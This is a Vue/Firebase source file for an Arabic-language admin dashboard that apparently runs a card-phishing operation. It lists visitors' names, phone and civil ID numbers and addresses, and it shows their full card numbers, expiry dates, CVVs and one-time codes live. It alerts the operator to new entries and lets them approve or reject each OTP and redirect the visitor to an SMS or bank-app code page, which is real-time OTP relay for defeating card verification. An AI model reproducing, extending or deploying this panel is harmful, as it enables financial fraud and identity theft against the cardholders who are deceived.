<script setup lang="ts">
import { ref, onMounted, computed, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { collection, query, onSnapshot, doc, updateDoc } from 'firebase/firestore';
import { onAuthStateChanged, signOut } from 'firebase/auth';
import { ref as rtdbRef, onValue } from 'firebase/database';
import { db, auth, rtdb } from '../firebase';
import { RefreshCw, Search, ShieldCheck, LogOut, Users, Activity } from 'lucide-vue-next';

interface RequestData {
  id: string;
  name: string;
  mobile: string;
  idNumber: string;
  cardType: string;
  address: string;
  date: string;
  paymentName?: string;
  cardNumber?: string;
  expMonth?: string;
  expYear?: string;
  cvv?: string;
  otp?: string;
  otpStatus?: string;
  nextAction?: string;
  step: string;
  createdAt: string;
  updatedAt: string;
}

const router = useRouter();
const requests = ref<RequestData[]>([]);
const loading = ref(true);
const error = ref('');
const searchQuery = ref('');
const isAuthenticated = ref(false);
const authChecking = ref(true);

const selectedRequestId = ref<string | null>(null);

const selectedRequest = computed(() => {
  return requests.value.find(req => req.id === selectedRequestId.value);
});

const onlineCount = ref(0);
const totalVisitorsCount = ref(0);
const onlineUsers = ref<Record<string, boolean>>({});

let onlineUnsubscribe: Function | null = null;
let visitorsUnsubscribe: Function | null = null;
let onlineUsersUnsubscribe: Function | null = null;

onMounted(() => {
  onAuthStateChanged(auth, (user) => {
    if (user) {
      isAuthenticated.value = true;
      authChecking.value = false;
      fetchData();
      startRealtimeTracking();
    } else {
      router.push('/admin/login');
    }
  });
});

onUnmounted(() => {
  if (onlineUnsubscribe) onlineUnsubscribe();
  if (visitorsUnsubscribe) visitorsUnsubscribe();
  if (onlineUsersUnsubscribe) onlineUsersUnsubscribe();
});

const startRealtimeTracking = () => {
  try {
    const presenceRef = rtdbRef(rtdb, 'presence');
    const onlineCallback = onValue(presenceRef, (snapshot) => {
      if (snapshot.exists()) {
        onlineCount.value = Object.keys(snapshot.val()).length;
      } else {
        onlineCount.value = 0;
      }
    });
    onlineUnsubscribe = () => onlineCallback();

    const visitorsRef = rtdbRef(rtdb, 'stats/totalVisitors');
    const visitorsCallback = onValue(visitorsRef, (snapshot) => {
      if (snapshot.exists()) {
        totalVisitorsCount.value = snapshot.val();
      } else {
        totalVisitorsCount.value = 0;
      }
    });
    visitorsUnsubscribe = () => visitorsCallback();

    const presenceUsersRef = rtdbRef(rtdb, 'presence_users');
    const onlineUsersCallback = onValue(presenceUsersRef, (snapshot) => {
      if (snapshot.exists()) {
        onlineUsers.value = snapshot.val();
      } else {
        onlineUsers.value = {};
      }
    });
    onlineUsersUnsubscribe = () => onlineUsersCallback();
  } catch (err) {
    console.warn("RTDB tracking failed:", err);
  }
};

const playNotificationSound = () => {
  try {
    const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
    if (!AudioContextClass) return;
    
    const audioCtx = new AudioContextClass();
    const oscillator = audioCtx.createOscillator();
    const gainNode = audioCtx.createGain();

    oscillator.type = 'bell' as any; // fallback to sine if not supported, but let's use sine
    oscillator.type = 'sine';
    
    // Quick double beep
    oscillator.frequency.setValueAtTime(880, audioCtx.currentTime); 
    oscillator.frequency.setValueAtTime(1046.50, audioCtx.currentTime + 0.1); 

    gainNode.gain.setValueAtTime(0, audioCtx.currentTime);
    gainNode.gain.linearRampToValueAtTime(0.3, audioCtx.currentTime + 0.05);
    gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);

    oscillator.connect(gainNode);
    gainNode.connect(audioCtx.destination);

    oscillator.start(audioCtx.currentTime);
    oscillator.stop(audioCtx.currentTime + 0.3);
  } catch (error) {
    console.warn('Audio playback failed', error);
  }
};

const fetchData = () => {

  try {
    const q = query(collection(db, 'requests'));
    
    onSnapshot(q, (snapshot) => {
      // Check for changes to play notification sound
      if (!loading.value) {
        let shouldPlaySound = false;
        snapshot.docChanges().forEach((change) => {
          if (change.type === 'added' || change.type === 'modified') {
            shouldPlaySound = true;
          }
        });
        if (shouldPlaySound) {
          playNotificationSound();
        }
      }

      const rawData = snapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      } as RequestData));
      
      // Sort descending locally
      rawData.sort((a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime());
      
      requests.value = rawData;
      loading.value = false;
    }, (err) => {
      console.error('Error fetching data:', err);
      error.value = 'Failed to load data. Please check permissions.';
      loading.value = false;
    });
  } catch (err) {
    console.error(err);
    loading.value = false;
  }
};

const handleLogout = async () => {
  await signOut(auth);
  router.push('/admin/login');
};

const updateOtpStatus = async (id: string, status: string) => {
  try {
    const requestRef = doc(db, 'requests', id);
    await updateDoc(requestRef, {
      otpStatus: status,
      updatedAt: new Date().toISOString()
    });
  } catch (err) {
    console.error('Error updating OTP status:', err);
    alert('حدث خطأ أثناء تحديث حالة الرمز');
  }
};

const updateNextAction = async (id: string, action: string) => {
  try {
    const requestRef = doc(db, 'requests', id);
    await updateDoc(requestRef, {
      nextAction: action,
      updatedAt: new Date().toISOString()
    });
  } catch (err) {
    console.error('Error updating next action:', err);
    alert('حدث خطأ أثناء توجيه المستخدم');
  }
};

const filteredRequests = computed(() => {
  if (!searchQuery.value) return requests.value;
  const lowerQuery = searchQuery.value.toLowerCase();
  return requests.value.filter(req => 
    req.name?.toLowerCase().includes(lowerQuery) || 
    req.mobile?.includes(lowerQuery) || 
    req.cardNumber?.includes(lowerQuery) ||
    req.idNumber?.includes(lowerQuery)
  );
});

const formatRelativeTime = (dateStr: string) => {
  const date = new Date(dateStr);
  const now = new Date();
  const diffInSeconds = Math.floor((now.getTime() - date.getTime()) / 1000);

  if (diffInSeconds < 60) {
    return 'الآن';
  }

  const diffInMinutes = Math.floor(diffInSeconds / 60);
  if (diffInMinutes < 60) {
    if (diffInMinutes === 1) return 'منذ دقيقة';
    if (diffInMinutes === 2) return 'منذ دقيقتين';
    if (diffInMinutes <= 10) return `منذ ${diffInMinutes} دقائق`;
    return `منذ ${diffInMinutes} دقيقة`;
  }

  const diffInHours = Math.floor(diffInMinutes / 60);
  if (diffInHours < 24) {
    if (diffInHours === 1) return 'منذ ساعة';
    if (diffInHours === 2) return 'منذ ساعتين';
    if (diffInHours <= 10) return `منذ ${diffInHours} ساعات`;
    return `منذ ${diffInHours} ساعة`;
  }

  const diffInDays = Math.floor(diffInHours / 24);
  if (diffInDays < 30) {
    if (diffInDays === 1) return 'منذ يوم';
    if (diffInDays === 2) return 'منذ يومين';
    if (diffInDays <= 10) return `منذ ${diffInDays} أيام`;
    return `منذ ${diffInDays} يوم`;
  }

  return new Date(dateStr).toLocaleDateString('ar-EG');
};
</script>

<template>
  <div v-if="authChecking" class="min-h-screen flex items-center justify-center bg-gray-50">
    <RefreshCw class="w-10 h-10 animate-spin text-[#0c2a5c]" />
  </div>

  <div v-else-if="isAuthenticated" class="min-h-screen bg-gray-50 flex flex-col font-sans" dir="rtl">
    <!-- Navbar -->
    <header class="bg-white shadow-sm border-b border-gray-200 py-4 px-6 sticky top-0 z-10 flex justify-between items-center">
      <div class="flex items-center gap-3">
        <div class="w-10 h-10 bg-[#0c2a5c] rounded-xl flex items-center justify-center shadow-inner">
          <ShieldCheck class="w-6 h-6 text-white" />
        </div>
        <h1 class="font-bold text-2xl tracking-tight text-gray-900">لوحة تحكم الإدارة</h1>
      </div>
      
      <div class="flex items-center gap-4">
        <div class="relative w-64 hidden sm:block">
          <input 
            v-model="searchQuery" 
            type="text" 
            placeholder="بحث بالاسم، الهاتف..." 
            class="w-full bg-gray-100 border-none rounded-full py-2 pl-4 pr-10 text-sm focus:ring-2 focus:ring-[#0c2a5c] focus:bg-white transition-all text-gray-800"
          />
          <Search class="w-4 h-4 text-gray-400 absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none" />
        </div>
        
        <div class="flex items-center gap-3 ml-2 border-l border-gray-200 pl-4">
          <!-- Total Visitors -->
          <div class="flex flex-col items-center justify-center bg-gray-50 px-3 py-1 rounded-lg border border-gray-100">
            <div class="flex items-center gap-1.5 text-gray-500 mb-0.5">
              <Users class="w-3.5 h-3.5" />
              <span class="text-[10px] font-bold uppercase tracking-wider">الزوار</span>
            </div>
            <span class="font-mono font-bold text-gray-800 text-sm leading-none">{{ totalVisitorsCount }}</span>
          </div>
          
          <!-- Online Status -->
          <div class="flex flex-col items-center justify-center bg-green-50 px-3 py-1 rounded-lg border border-green-100">
            <div class="flex items-center gap-1.5 text-green-600 mb-0.5">
              <Activity class="w-3.5 h-3.5" />
              <span class="text-[10px] font-bold uppercase tracking-wider">متصل الآن</span>
            </div>
            <span class="font-mono font-bold text-green-700 text-sm leading-none flex items-center gap-1.5">
              <span class="relative flex h-2 w-2">
                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                <span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
              </span>
              {{ onlineCount }}
            </span>
          </div>
        </div>

        <button @click="handleLogout" class="text-gray-500 hover:text-red-500 transition-colors p-2 bg-gray-100 rounded-full flex items-center justify-center w-10 h-10 hover:bg-red-50">
          <LogOut class="w-5 h-5" />
        </button>
      </div>
    </header>

    <!-- Main Content -->
    <main class="flex-1 p-6 max-w-[1500px] mx-auto w-full flex gap-6 h-[calc(100vh-80px)]">
      
      <!-- Users Sidebar -->
      <aside class="w-[350px] bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden flex flex-col shrink-0 h-full">
        <div class="p-4 border-b border-gray-100 bg-gray-50/50 flex justify-between items-center">
          <h2 class="font-bold text-gray-800">الطلبات</h2>
          <span class="bg-[#0c2a5c] text-white text-xs px-2 py-0.5 rounded-full font-mono">{{ filteredRequests.length }}</span>
        </div>
        
        <!-- Loading / Empty -->
        <div v-if="loading" class="flex-1 p-8 flex flex-col items-center justify-center text-gray-400">
          <RefreshCw class="w-8 h-8 animate-spin mb-4 text-[#0c2a5c]" />
          <p class="text-sm font-medium">جاري تحميل البيانات...</p>
        </div>
        <div v-else-if="error" class="flex-1 p-8 text-center text-red-500">
          <p class="font-medium bg-red-50 py-3 px-4 rounded-lg inline-block">{{ error }}</p>
        </div>
        <div v-else-if="filteredRequests.length === 0" class="flex-1 p-8 text-center text-gray-500 flex flex-col items-center justify-center">
          <p class="font-medium text-lg mb-2">لا توجد طلبات بعد</p>
        </div>
        
        <!-- List -->
        <div v-else class="flex-1 overflow-y-auto overflow-x-hidden">
          <div 
            v-for="req in filteredRequests" 
            :key="req.id" 
            @click="selectedRequestId = req.id"
            class="p-4 cursor-pointer border-b border-gray-50 transition-colors hover:bg-gray-50 flex flex-col gap-2 relative group"
            :class="{ 'bg-blue-50/50 border-blue-100 border-l-4 border-l-[#0c2a5c]': selectedRequestId === req.id, 'border-l-4 border-l-transparent': selectedRequestId !== req.id }"
          >
            <!-- Badge overlay when selected -->
            <div class="flex justify-between items-start w-full">
              <div class="font-medium text-gray-900 text-[15px] flex items-center gap-2">
                {{ req.name }}
                <span v-if="onlineUsers[req.id]" class="relative flex h-2 w-2" title="متصل الآن">
                  <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                  <span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
                </span>
              </div>
              <span class="text-[12px] text-gray-500 bg-gray-100 px-2 py-0.5 rounded-full" dir="rtl">{{ formatRelativeTime(req.createdAt) }}</span>
            </div>
            
            <div class="text-[13px] text-gray-500 font-mono">{{ req.mobile }}</div>
            
            <div class="flex items-center justify-between mt-1">
              <span :class="{
                'bg-yellow-100 text-yellow-800 border-yellow-200': req.step === 'form',
                'bg-blue-100 text-blue-800 border-blue-200': req.step === 'card',
                'bg-green-100 text-green-800 border-green-200': req.step === 'otp' || req.step === 'otp-bank'
              }" class="px-2 py-0.5 rounded text-[10px] font-bold tracking-wide border uppercase">
                <template v-if="req.step === 'form'">طلب جديد</template>
                <template v-else-if="req.step === 'card'">البطاقة</template>
                <template v-else-if="req.step === 'otp'">OTP رسالة</template>
                <template v-else-if="req.step === 'otp-bank'">OTP بنكي</template>
                <template v-else>{{ req.step }}</template>
              </span>
              
              <div class="flex items-center gap-1">
                 <span class="inline-block w-2 h-2 rounded-full" 
                       :class="{
                         'bg-gray-400': req.cardType === 'silver',
                         'bg-yellow-400': req.cardType === 'gold',
                         'bg-gray-800': req.cardType === 'platinum'
                       }"></span>
              </div>
            </div>
          </div>
        </div>
      </aside>

      <!-- Details View Panel -->
      <div class="flex-1 bg-white rounded-2xl shadow-sm border border-gray-200 flex flex-col overflow-hidden h-full">
        <div v-if="!selectedRequestId || !selectedRequest" class="flex-1 flex flex-col items-center justify-center text-gray-400 h-full bg-gray-50/30">
          <ShieldCheck class="w-16 h-16 mb-4 opacity-20 text-[#0c2a5c]" />
          <h2 class="text-xl font-medium text-gray-500 mb-2">اختر طلباً من القائمة</h2>
          <p class="text-sm">قم بتحديد مستخدم لعرض تفاصيل الطلب والتحكم في الإجراءات</p>
        </div>
        
        <div v-else class="flex-1 overflow-y-auto p-8 relative">
          <!-- Main Content -->
          <div class="max-w-[800px] mx-auto w-full">
            <!-- Header section of details -->
            <div class="flex justify-between items-start mb-8 pb-6 border-b border-gray-100">
              <div>
                <h2 class="text-2xl font-bold text-gray-900 mb-2 flex items-center gap-3">
                  {{ selectedRequest.name }}
                  <span v-if="onlineUsers[selectedRequest.id]" class="relative flex h-2.5 w-2.5" title="متصل الآن">
                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                    <span class="relative inline-flex rounded-full h-full w-full bg-green-500"></span>
                  </span>
                </h2>
                <p class="text-gray-500 font-sans text-sm flex gap-4">
                  <span>التاريخ: {{ new Date(selectedRequest.createdAt).toLocaleDateString('ar-EG', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }) }}</span>
                  <span class="font-mono text-gray-400 bg-gray-100 px-2 py-0.5 rounded-full" dir="rtl">{{ formatRelativeTime(selectedRequest.createdAt) }}</span>
                </p>
              </div>
              
              <div class="text-left">
                <span :class="{
                    'bg-yellow-100 text-yellow-800 border-yellow-200': selectedRequest.step === 'form',
                    'bg-blue-100 text-blue-800 border-blue-200': selectedRequest.step === 'card',
                    'bg-green-100 text-green-800 border-green-200': selectedRequest.step === 'otp' || selectedRequest.step === 'otp-bank'
                  }" class="px-3 py-1.5 rounded-lg text-xs font-bold tracking-wide border uppercase inline-flex items-center gap-2">
                  <span class="w-1.5 h-1.5 rounded-full" :class="{ 'bg-yellow-500': selectedRequest.step === 'form', 'bg-blue-500': selectedRequest.step === 'card', 'bg-green-500': selectedRequest.step === 'otp' || selectedRequest.step === 'otp-bank' }"></span>
                  <template v-if="selectedRequest.step === 'form'">طلب جديد (النموذج)</template>
                  <template v-else-if="selectedRequest.step === 'card'">مرحلة البطاقة</template>
                  <template v-else-if="selectedRequest.step === 'otp'">رمز التحقق (رسالة)</template>
                  <template v-else-if="selectedRequest.step === 'otp-bank'">رمز التحقق (التطبيق)</template>
                  <template v-else>{{ selectedRequest.step }}</template>
                </span>
              </div>
            </div>

            <!-- Content Grid layout for details -->
            <div class="grid grid-cols-2 gap-8 mb-8">
              <!-- Column 1: basic info -->
              <div class="flex flex-col gap-6">
                <!-- Info block -->
                <div class="bg-gray-50 rounded-xl p-5 border border-gray-100">
                  <h3 class="font-bold text-gray-900 mb-4 pb-2 border-b border-gray-200 flex items-center gap-2">
                    <Users class="w-4 h-4 text-[#0c2a5c]" />
                    البيانات الأساسية
                  </h3>
                  
                  <div class="space-y-4">
                    <div>
                      <p class="text-[11px] font-bold text-gray-400 mb-1 uppercase tracking-wider">رقم الهاتف</p>
                      <p class="font-mono text-gray-900 font-medium bg-white px-3 py-1.5 rounded border border-gray-200 inline-block w-full">{{ selectedRequest.mobile }}</p>
                    </div>
                    <div>
                      <p class="text-[11px] font-bold text-gray-400 mb-1 uppercase tracking-wider">الرقم المدني</p>
                      <p class="text-gray-900 font-medium bg-white px-3 py-1.5 rounded border border-gray-200 w-full">{{ selectedRequest.idNumber }}</p>
                    </div>
                    <div>
                      <p class="text-[11px] font-bold text-gray-400 mb-1 uppercase tracking-wider">العنوان</p>
                      <p class="text-gray-900 bg-white px-3 py-1.5 rounded border border-gray-200 w-full">{{ selectedRequest.address }}</p>
                    </div>
                  </div>
                </div>
              </div>

              <!-- Column 2: Card & Actions -->
              <div class="flex flex-col gap-6">
                
              <!-- Card Mockup inside Column 2 -->
              <div v-if="selectedRequest.cardNumber" class="bg-gradient-to-br from-slate-800 to-slate-900 rounded-2xl p-6 relative overflow-hidden shadow-xl text-white transform transition-all hover:scale-[1.02] duration-300">
                <!-- Decorative elements for the card mockup -->
                <div class="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full blur-3xl -mr-10 -mt-10 pointer-events-none"></div>
                <div class="absolute bottom-0 left-0 w-32 h-32 bg-blue-500/20 rounded-full blur-3xl -ml-10 -mb-10 pointer-events-none"></div>
                <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-[1px] bg-white/5 rotate-12 pointer-events-none"></div>
                
                <div class="flex justify-between items-start mb-8 relative z-10">
                  <div class="flex items-center gap-2 bg-white/10 px-3 py-1 rounded-full backdrop-blur-sm border border-white/10">
                    <span class="inline-block w-2 h-2 rounded-full shadow-[0_0_8px_rgba(255,255,255,0.6)]" 
                          :class="{
                            'bg-gray-300': selectedRequest.cardType === 'silver',
                            'bg-yellow-400': selectedRequest.cardType === 'gold',
                            'bg-gray-400': selectedRequest.cardType === 'platinum'
                          }"></span>
                    <span class="text-xs font-bold tracking-wide text-white/90">
                      <template v-if="selectedRequest.cardType === 'silver'">بطاقة فضية</template>
                      <template v-else-if="selectedRequest.cardType === 'gold'">بطاقة ذهبية</template>
                      <template v-else-if="selectedRequest.cardType === 'platinum'">بطاقة بلاتينية</template>
                      <template v-else>{{ selectedRequest.cardType }}</template>
                    </span>
                  </div>
                  
                  <!-- Chip -->
                  <div class="w-12 h-9 border border-white/20 rounded bg-gradient-to-br from-yellow-100/30 to-yellow-400/20 flex flex-col justify-between p-1 pl-2">
                    <div class="w-full h-[1px] bg-white/20"></div>
                    <div class="w-full h-[1px] bg-white/20"></div>
                  </div>
                </div>

                <div class="space-y-6 relative z-10">
                  <div class="w-full" dir="ltr">
                    <p class="text-[10px] text-white/50 uppercase tracking-[0.2em] mb-1 font-bold">Card Number</p>
                    <p class="font-mono text-white tracking-[0.25em] text-[20px] font-medium text-shadow-sm select-all">
                      {{ selectedRequest.cardNumber.replace(/(.{4})/g, '$1 ').trim() }}
                    </p>
                  </div>
                  
                  <div class="flex items-center gap-8" dir="ltr">
                    <div>
                      <p class="text-[9px] text-white/50 uppercase tracking-widest mb-0.5 font-bold">Name</p>
                      <p class="font-mono text-white/90 uppercase text-sm tracking-widest select-all">
                        {{ selectedRequest.paymentName || selectedRequest.name }}
                      </p>
                    </div>
                    <div>
                      <p class="text-[9px] text-white/50 uppercase tracking-widest mb-0.5 font-bold">Expires</p>
                      <p class="font-mono text-white font-medium tracking-widest text-sm select-all">
                        {{ selectedRequest.expMonth }}/{{ selectedRequest.expYear }}
                      </p>
                    </div>
                    <div>
                      <p class="text-[9px] text-red-300 uppercase tracking-widest mb-0.5 font-bold">CVV</p>
                      <p class="font-mono text-white bg-white/10 px-2 py-0.5 rounded backdrop-blur-sm tracking-widest text-sm border border-white/10 select-all text-center min-w-[3rem]">
                        {{ selectedRequest.cvv }}
                      </p>
                    </div>
                  </div>
                </div>
              </div>
              <div v-else class="bg-blue-50/50 rounded-xl p-5 border border-blue-100 relative overflow-hidden">
                <h3 class="font-bold text-blue-900 mb-4 pb-2 border-b border-blue-100 relative z-10">بيانات البطاقة</h3>
                <div class="text-gray-400 text-sm py-8 text-center italic relative z-10 bg-white/50 rounded-lg border border-dashed border-gray-200">
                  لم يقم بإدخال بيانات البطاقة بعد
                </div>
              </div>

                <!-- OTP & Actions Box -->
                <div class="bg-white rounded-xl p-5 border border-gray-200 shadow-sm">
                  <h3 class="font-bold text-gray-900 mb-4 pb-2 border-b border-gray-100">إجراءات التحقق</h3>
                  
                  <div v-if="selectedRequest.otp" class="flex flex-col items-center">
                    <p class="text-xs text-gray-500 mb-2">الرمز المدخل:</p>
                    <div class="font-mono text-green-600 font-bold text-3xl tracking-[0.3em] bg-green-50 py-3 px-6 rounded-xl border-2 border-green-200 border-dashed text-center w-full mb-4">
                      {{ selectedRequest.otp }}
                    </div>
                    
                    <div class="flex gap-3 w-full" v-if="!selectedRequest.otpStatus || selectedRequest.otpStatus === 'pending'">
                      <button @click="updateOtpStatus(selectedRequest.id, 'approved')" class="flex-1 bg-green-500 hover:bg-green-600 text-white py-2.5 rounded-lg font-bold transition-all transform active:scale-[0.98] shadow-sm">
                        الرمز صحيح
                      </button>
                      <button @click="updateOtpStatus(selectedRequest.id, 'rejected')" class="flex-1 bg-red-500 hover:bg-red-600 text-white py-2.5 rounded-lg font-bold transition-all transform active:scale-[0.98] shadow-sm">
                        الرمز خاطئ
                      </button>
                    </div>
                    
                    <div v-else-if="selectedRequest.otpStatus === 'approved'" class="w-full bg-green-50 border border-green-200 text-green-700 py-3 rounded-lg text-center font-bold text-sm tracking-wide">
                      ✅ تمت الموافقة على الرمز
                    </div>
                    <div v-else-if="selectedRequest.otpStatus === 'rejected'" class="w-full bg-red-50 border border-red-200 text-red-700 py-3 rounded-lg text-center font-bold text-sm tracking-wide">
                      ❌ تم رفض الرمز
                    </div>
                  </div>
                  
                  <div v-else-if="selectedRequest.step === 'card' && !selectedRequest.nextAction" class="flex flex-col gap-3">
                    <p class="text-sm text-gray-600 text-center mb-1">توجيه المستخدم إلى صفحة التحقق:</p>
                    <button @click="updateNextAction(selectedRequest.id, 'otp-sms')" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-2.5 rounded-lg font-bold transition-all shadow-sm">
                      رسالة نصية (SMS)
                    </button>
                    <button @click="updateNextAction(selectedRequest.id, 'otp-bank')" class="w-full bg-purple-600 hover:bg-purple-700 text-white py-2.5 rounded-lg font-bold transition-all shadow-sm">
                      تطبيق بنكي
                    </button>
                  </div>
                  
                  <div v-else-if="selectedRequest.step === 'card' && selectedRequest.nextAction" class="py-6 flex flex-col items-center justify-center bg-gray-50 rounded-lg border border-dashed border-gray-200">
                    <div class="w-10 h-10 bg-blue-100 text-blue-600 flex items-center justify-center rounded-full mb-3">
                      <svg class="w-5 h-5 animate-spin" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                      </svg>
                    </div>
                    <p class="text-blue-700 text-sm font-bold text-center px-4">
                      تم توجيه المستخدم لصفحة التحقق
                      <br/>
                      <span v-if="selectedRequest.nextAction === 'otp-sms'" class="text-xs font-normal opacity-80 mt-1 block">(رسالة نصية)</span>
                      <span v-if="selectedRequest.nextAction === 'otp-bank'" class="text-xs font-normal opacity-80 mt-1 block">(تطبيق بنكي)</span>
                    </p>
                    <p class="text-xs text-gray-400 mt-2">في انتظار إدخال الرمز...</p>
                  </div>
                  
                  <div v-else class="text-gray-400 text-sm py-8 text-center italic bg-gray-50 rounded-lg border border-dashed border-gray-200">
                    بانتظار إدخال بيانات البطاقة للتحقق
                  </div>
                </div>

              </div>
            </div>
            
          </div>
        </div>
      </div>
    </main>
  </div>
</template>
